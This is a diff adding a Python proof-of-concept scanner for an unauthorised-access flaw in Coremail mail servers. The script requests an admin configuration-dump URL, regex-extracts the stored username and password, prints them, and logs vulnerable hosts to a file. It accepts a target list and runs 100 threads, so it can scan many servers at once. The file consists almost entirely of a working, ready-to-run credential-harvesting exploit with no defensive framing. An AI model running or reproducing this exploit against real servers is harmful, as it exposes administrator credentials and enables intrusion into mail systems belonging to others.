@@ -1,0 +1,69 @@
+import requests,sys,re,argparse,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test="""
+   ___                                          .         .     .                      .    _                                       _
+ .'   \   __.  .___    ___  , _ , _     ___  `  |         /     / , __     ___  ,   . _/_   /        __.  .___  ` ____    ___    ___/
+ |      .'   \ /   \ .'   ` |' `|' `.  /   ` |  |   .---' |     | |'  `.  /   ` |   |  |    |,---. .'   \ /   \ |    /  .'   `  /   |
+ |      |    | |   ' |----' |   |   | |    | |  |         |     | |    | |    | |   |  |    |'   ` |    | |   ' |  ,/   |----' ,'   |
+  `.__,  `._.' /     `.___, /   '   / `.__/| / /\__        `._.'  /    | `.__/| `._/|  \__/ /    |  `._.' /     / /__.' `.___, `___,'
+
+                                                                                  `                 `
+"""
+
+
+    print(test)
+
+
+
+def main():
+    banner()
+    parser=argparse.ArgumentParser(description='Coremail-Unauthorized')
+    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
+    args=parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+
+
+def poc(target):
+    url_payload= '/mailsms/s?func=ADMIN:appState&dumpConfig=/'
+    headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'}
+    proxies = {
+    'http':'http://127.0.0.1:8080',
+    'https':'http://127.0.0.1:8080'
+}
+
+    try:
+        res1=requests.get(url=target+url_payload,headers=headers,proxies=proxies,timeout=6)
+        match = re.findall(r'<string name="Password">(.*?)</string>',res1.text,re.S)
+        match1 = re.findall(r'<string name="User">(.*?)</string>',res1.text,re.S)
+        if match and match1:
+            print( f"[+]{target} 存在未授权访问漏洞！,账号是:{match1[1]},密码是:{match[1]}")
+            with open('result.txt','a',encoding='utf-8')as fp:
+                fp.write(target+'\n')
+                return True
+        else:
+            print('[-] 不存在漏洞')
+            return False
+    except:
+        print('目标网站存在问题，无法访问')
+
+
+
+if __name__ =='__main__':
+    main()
